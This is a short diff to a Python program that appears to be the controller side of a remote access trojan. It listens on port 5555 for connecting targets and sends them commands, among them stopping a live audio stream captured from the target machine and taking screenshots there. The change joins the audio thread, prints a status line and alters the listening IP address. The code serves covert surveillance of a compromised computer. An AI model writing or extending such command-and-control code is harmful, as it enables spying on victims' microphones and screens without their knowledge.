@@ -180,6 +180,8 @@ def target_communication():
             print(result)
         elif command == 'listening_stop':
             stream_flag['on'] = False
+            audio_thread.join()  # Wait for the audio thread to finish
+            print("[+] Audio stream stopped.")
         elif command == 'screenshot':
             # If the user enters 'screenshot', send a command to take a screenshot on the target.
             shot = reliable_recv()
@@ -210,7 +212,7 @@ def target_communication():
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.210.143', 5555))
+sock.bind(('192.168.210.1', 5555))
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
 print('[+] Listening For The Incoming Connections')
